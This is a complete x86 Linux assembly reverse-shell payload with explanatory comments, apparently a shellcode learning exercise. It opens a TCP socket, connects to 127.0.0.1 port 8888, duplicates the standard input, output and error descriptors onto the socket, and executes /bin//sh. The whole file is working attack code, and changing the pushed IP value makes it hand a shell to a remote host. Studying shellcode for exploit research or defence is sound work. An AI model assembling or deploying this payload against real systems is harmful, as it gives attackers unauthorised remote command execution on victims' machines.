global _start

section .text
_start:

;###socket###
;socket(AF_INET , SOCK_STREAM , 0);

;xor eax, eax
;mov al, 0x66 ;socketcall
push byte 0x66
pop eax

xor ebx, ebx

;push the list of arguments onto the stack
push ebx ;ebx=0 (PROT)
inc ebx
push ebx ; ebx=1 (SOCK_STREAM)
inc ebx
push ebx ;ebx=2 (AF_INET)

dec ebx ;ebx=1

mov ecx, esp ;pass the pointer to the list of arguments to ecx

int 0x80
mov edi, eax ; save socket fd into edi (eax may change!)

;###connect ###

;struct sockaddr_in {
;	unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
;	unsigned short  sin_port;       /* Address port (16 bits) */
;	struct in_addr sin_addr;        /*  Internet address (32 bits) */
;	char sin_zero[8];               /* Not used */
;};
;
;struct in_addr {
;	unsigned long s_addr;  // load with inet_aton()
;};
push 0x0101017f 
push word 0xb822 ; sin_port=8888 
push word 0x02

mov esi, esp ;save the pointer to the struct in esi

; connect syscall
;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
push byte 0x66
pop eax ; socketcall
push byte 0x03
pop ebx ; connect

push 0x10 ; addressLength=16bytes. short+short+8+long=2+2+8+4=16
push esi ; address of the struct 
push edi ; socket fd

mov ecx, esp ;pass the pointer to the list of arguments to ecx
int 0x80

;###copy file descriptors###
;dup2(sock, 0);
;dup2(sock, 1);
;dup2(sock, 2);

push byte 0x3f;dup2
pop eax
mov ebx, edi
xor ecx, ecx

int 0x80

push byte 0x3f;dup2
pop eax
push byte 0x1
pop ecx

int 0x80

push byte 0x3f;dup2
pop eax
inc ecx

int 0x80

;###execve###
push byte 0x0b
pop eax ;sys_execve
xor ebx, ebx 
push ebx ;terminate string with \0
push 0x68732f2f ;String "hs//"
push 0x6e69622f;String "nib/"
mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
